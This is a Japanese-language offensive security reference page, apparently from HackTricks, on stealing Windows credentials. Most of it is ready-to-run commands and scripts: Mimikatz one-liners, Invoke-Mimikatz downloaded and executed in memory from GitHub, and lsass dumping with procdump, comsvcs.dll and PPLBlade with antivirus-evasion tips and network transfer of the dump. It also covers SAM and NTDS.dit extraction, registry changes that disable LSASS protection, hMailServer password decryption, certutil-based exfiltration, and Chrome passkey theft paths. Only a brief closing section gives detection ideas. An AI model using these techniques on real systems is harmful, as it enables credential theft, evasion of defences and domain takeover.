# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz による資格情報
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzで実行できるその他のことは** [**このページ**](credentials-mimikatz.md)**で確認できます。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**ここで認証情報の保護方法について確認できます。**](credentials-protections.md) **これらの保護により、Mimikatzによる一部の認証情報の抽出を防止できる可能性があります。**

## Meterpreterでの認証情報

私が作成した[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、被害者内部のパスワードとハッシュを検索します。**
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV の bypass

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規の Microsoft ツールであるため**、Defender では検知されません。\
このツールを使用して**lsass process を dump**し、**dump を download**して、dump から**credentials をローカルで extract**できます。

[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: 一部の **AV** は、**procdump.exe を使用して lsass.exe を dump する**操作を **malicious** として **detect** する可能性があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を **detect** しているためです。そのため、procdump に **lsass.exe の名前**を渡す代わりに、lsass.exe の **PID** を **argument** として渡す方が **stealthier** です。

### **comsvcs.dll** による lsass の Dump

`C:\Windows\System32` にある **comsvcs.dll** という名前の DLL は、クラッシュ時の **process memory の dump** を担当します。この DLL には **`MiniDumpW`** という名前の **function** が含まれており、`rundll32.exe` を使用して呼び出すよう設計されています。\
最初の2つの引数は使用しても意味がありませんが、3つ目は3つの要素に分かれています。dump 対象の process ID が1つ目の要素、dump file の場所が2つ目、3つ目の要素は必ず **full** という単語になります。代替オプションはありません。\
これら3つの要素が解析されると、DLL は dump file の作成を開始し、指定された process の memory をこの file に転送します。\
**comsvcs.dll** を使用して lsass process を dump できるため、procdump を upload して実行する必要がなくなります。この方法については [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) で詳しく説明されています。

実行には次の command を使用します:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Manager で lsass を dump する**

1. Task Bar を右クリックし、Task Manager をクリックする
2. More details をクリックする
3. Processes タブで「Local Security Authority Process」プロセスを検索する
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックする

### procdump で lsass を dump する

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部である Microsoft 署名済みバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade を使用した lsass のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに書き込まずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護のバイパス
2. メモリダンプファイルを難読化して、Defender のシグネチャベースの検知メカニズムを回避
3. ディスクに書き込まずに RAW および SMB upload methods を使用してメモリダンプをアップロード（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDumpを使わないSSPベースのLSASSダンピング

Ink Dragonには、`MiniDumpWriteDump`を一度も呼び出さない3段階のdumper **LalsDumper** が含まれているため、そのAPIへのEDR hookは発火しない:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`内で32個の小文字の`d`からなるplaceholderを検索し、`rtu.txt`へのabsolute pathで上書きする。パッチ済みのDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出す。これにより、悪意のあるDLLが新しいSecurity Support Provider (SSP)として**LSASS**にloadされる。
2. **Stage 2 inside LSASS** – LSASSが`nfdp.dll`をloadすると、DLLは`rtu.txt`を読み込み、各byteを`0x20`でXORし、decodeしたblobをmemoryにmapしてからexecutionをtransferする。
3. **Stage 3 dumper** – mapされたpayloadは、hashed API names（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）から解決した**direct syscalls**を使用してMiniDump logicを再実装する。`Tom`という専用exportは`%TEMP%\<pid>.ddt`をopenし、compressed LSASS dumpをfileにstreamしてからhandleをcloseするため、後でexfiltrationできる。

Operator notes:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt`を同じdirectoryに置くこと。Stage 1はhard-coded placeholderを`rtu.txt`へのabsolute pathで書き換えるため、分離するとchainが壊れる。
* Registrationは`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`に`nfdp`をappendすることで行われる。このvalueを自分でseedしておけば、毎回のboot時にLSASSがSSPをreloadするようにできる。
* `%TEMP%\*.ddt` filesはcompressed dumpsである。localでdecompressしてから、credential extractionのためにMimikatz/Volatilityへ渡す。
* `lals.exe`の実行にはadmin/SeTcb rightsが必要であり、`AddSecurityPackageA`を成功させる必要がある。このcallがreturnすると、LSASSはrogue SSPを透過的にloadしてStage 2をexecuteする。
* DLLをdiskから削除しても、LSASSからevictされることはない。registry entryを削除してLSASSをrestartする（reboot）か、long-term persistenceのために残しておく。

## CrackMapExec

### SAMハッシュのdump
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA secrets のダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 対象 DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 対象の DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM と SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に**存在するはずです**。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。

### Registry から

これらのファイルを窃取する最も簡単な方法は、Registry からコピーを取得することです。
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
それらのファイルをKali machineに**ダウンロード**し、**hashesを抽出**するには、次を使用します：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

この service を使用して、保護されたファイルをコピーできます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin binary は Windows Server versions でのみ利用できます。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell** から同じことを実行することもできます。以下は **SAM file をコピーする方法** の例です（使用するハードドライブは「C:」で、C:\users\Public に保存されます）が、これを使用して保護された任意のファイルをコピーできます:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して、SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の中核として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** にあります。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

詳細については、こちらを参照してください: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows はこのファイルとのやり取りに _Ntdsa.dll_ を使用し、_lsass.exe_ によって利用されます。そのため、**NTDS.dit** ファイルの**一部**は **`lsass`** のメモリ内に存在する可能性があります（パフォーマンス向上のために **cache** が使用されることで、最新のアクセスデータを取得できる可能性があります）。

#### NTDS.dit 内の hashes の復号

hash は3回暗号化されています。

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を復号します。
2. **PEK** と **RC4** を使用して **hash** を復号します。
3. **DES** を使用して **hash** を復号します。

**PEK** はすべての domain controller で**同じ値**ですが、**domain controller の SYSTEM file の BOOTKEY（domain controller ごとに異なります）**を使用して **NTDS.dit** ファイル内で**暗号化**されています。そのため、NTDS.dit ファイルから credentials を取得するには、NTDS.dit と SYSTEM のファイルが必要です（_C:\Windows\System32\config\SYSTEM_）。

### Ntdsutil を使用した NTDS.dit のコピー

Windows Server 2008 以降で利用できます。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) の trick を使用して **ntds.dit** ファイルをコピーすることもできます。なお、**SYSTEM file** のコピーも必要になります（同様に、[**registry から dump するか、volume shadow copy**](#stealing-sam-and-system) の trick を使用してください）。

### **NTDS.dit からハッシュを抽出**

**NTDS.dit** と **SYSTEM** のファイルを **入手** したら、_secretsdump.py_ などの tools を使用して **ハッシュを抽出** できます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効なドメイン管理者ユーザーを使用して、**自動的に抽出**することもできます：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きな NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit からドメイン オブジェクトを SQLite データベースに抽出する**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS オブジェクトを SQLite データベースに抽出できます。secrets だけでなく、取得済みの raw NTDS.dit ファイルからさらに情報を抽出できるよう、オブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive は任意ですが、secret の復号に使用されます（NT および LM hashes、cleartext passwords などの supplemental credentials、kerberos または trust keys、NT および LM password histories）。その他の情報とともに、次のデータが抽出されます: hashes 付きの user および machine accounts、UAC flags、last logon および password change の timestamp、accounts description、names、UPN、SPN、groups および recursive memberships、organizational units tree および membership、trusts type・direction・attributes 付きの trusted domains...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary をダウンロードします。この binary を使用すると、複数の software から credentials を抽出できます。
```
lazagne.exe all
```
## SAM and LSASS から credentials を抽出するその他の tools

### Windows credentials Editor (WCE)

この tool は memory から credentials を抽出するために使用できます。以下から download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file から credentials を抽出します
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM fileからcredentialをextractする
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

こちらからダウンロードできます：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。そのまま **execute it** すると、パスワードが抽出されます。

## アイドル状態の RDP セッションの調査とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には、あらゆる red teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています。

### DumpRDPHistory スタイルの telemetry collection

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にあるすべての user hive を解析します。各サブキーには、サーバー名、`UsernameHint`、最終書き込み timestamp が保存されています。PowerShell を使って FinalDraft のロジックを再現できます。

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log を照会し、Event ID **21**（successful logon）と **25**（disconnect）を取得して、誰がそのマシンを管理していたかを把握します。

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているか把握したら、その **disconnected** session がまだ存在している間に、LalsDumper/Mimikatz で LSASS を dump します。CredSSP + NTLM fallback によって verifier と token が LSASS に残るため、それらを SMB/WinRM 経由で replay し、`NTDS.dit` を取得したり、domain controller 上で persistence を仕掛けたりできます。

### FinalDraft が標的とするレジストリの downgrade

同じ implant は、credential theft を容易にするため、複数のレジストリ key も改変します。
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP で完全な credential/ticket reuse が強制され、pass-the-hash 型の pivot が可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化するため、local admin がネットワーク経由で unrestricted token を取得します。
* `DSRMAdminLogonBehavior=2` により、DC がオンライン中でも DSRM administrator がログオンできるようになり、攻撃者に別の組み込み high-privilege account が提供されます。
* `RunAsPPL=0` は LSASS PPL protections を削除し、LalsDumper などの dumper による memory access を容易にします。

## hMailServer の database credentials（侵害後）

hMailServer は DB password を `[Database] Password=` の下に `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 内へ保存します。この値は static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish-encrypted されています。INI の hex string を次の Python snippet で使用します:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードを使用して、ファイルロックを回避するために SQL CE データベースをコピーし、32-bit provider を読み込み、必要に応じて upgrade してから hashes をクエリします。
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` column は hMailServer の hash format（hashcat mode `1421`）を使用します。これらの値を cracking すると、WinRM/SSH pivots に再利用可能な credentials を取得できます。
## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部の tooling は、LSA logon callback `LsaApLogonUserEx2` を intercept することで **plaintext logon passwords** を capture します。考え方としては、authentication package callback を hook または wrap し、credentials を **logon 中**（hashing 前）に capture してから disk に書き込むか、operator に返します。一般的には、LSA に inject または register する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。

Operational notes:
- authentication path に helper を load するには、local admin/SYSTEM が必要です。
- Captured credentials は、logon が発生した場合にのみ表示されます（hook に応じて interactive、RDP、service、または network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、保存された connection information を per-user の `sqlstudio.bin` file に保存します。専用の dumpers は file を parse して、保存された SQL credentials を recover できます。command output しか返さない shells では、file を Base64 として encode し、stdout に print して exfiltrate することがよくあります。
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
オペレーター側でファイルを再ビルドし、認証情報を復元するためにdumperをローカルで実行します：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Windows上のChromeからのPasskeys / WebAuthn credential theft

Windowsホスト上で、**victim user**として **Chrome + Google Password Manager synced passkeys** を使用している状態で **code execution** を取得すると、**admin/SYSTEM** 権限がなくても、Passkeysは興味深い **post-exploitation** の標的になります。

### 興味深いローカルアーティファクト
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** には protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkey の **RP ID**、**username**、**credential ID**、および暗号化された秘密鍵マテリアルを列挙できます。
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** などのローカルデバイス登録状態と、同期された認証情報の復元に使用されるラップ済みの秘密情報が保存されます。

クイックトリアージ:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs はローカル signing oracle として悪用できる

ブラウザが **`NCRYPT_OPAQUE_KEY_BLOB`** として TPM-backed identity key をエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、malware は raw private key を抽出する必要がありません。単に **同じマシン**上で blob を再インポートし、ローカル TPM に attacker-controlled data への署名を要求できます。
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
これは、**hardware binding はデバイス外への export を防止するが、侵害された endpoint 上での同一ユーザーによる利用は防止しない**ことを意味します。

### Practical abuse paths

1. **Pass-ta-key / device-identity relay**
- Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
- passkey login を開始し、新しい WebAuthn challenge を取得する。
- 盗み出した `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
- 返された assertion を relying party に relay する。
- これは、RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否できない場合に特に有効である。
2. **Pending UV-key hijack**
- `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` operation を送信して、再オンボーディングを強制する。
- オンボーディング後にデバイスが **`uv_key_pending`** の状態になった場合、攻撃者が管理する UV public key を登録する。
- provider が新しい UV key の attestation / secure-hardware origin を検証しない場合、その攻撃者 key による後続の署名は **`UV=1`** として扱われる。
3. **Master-secret / SDS recovery theft**
- recovery または rejoin を強制し、Chrome に synced-passkey master secret を取得させる。
- `passkey_enclave_state` の再作成または変更を監視し、その後、平文の **security domain secret (SDS)** が常駐している間に Chrome のメモリを dump する。
- 回収した SDS を使用して、すべての `WebauthnCredentialSpecifics` record 内の暗号化フィールドを復号し、portable WebAuthn private key を回収する。

### DFIR / detection ideas

- `passkey_enclave_state` の**削除 / 再作成**を監視する。
- ブラウザ以外の process による Chrome の **`Sync Data\LevelDB`** への異常なアクセスを alert する。
- **Chrome memory dump** または suspicious な cross-process memory access を alert する。
- Google Password Manager の recovery PIN prompt が繰り返し表示される場合や、予期しない再オンボーディングを調査する。
- WebAuthn の **`signCount`** は synced passkey では一定のままになる場合が多く、有用でないことに注意する。そのため、classic clone detection の有効性は低い。

## References

- [Unit 42 – 高価値セクターを標的とした、長年にわたる未検知の operations に関する調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 による SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: stealthy な offensive operation の relay network と内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: passwordless authentication における新たな attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
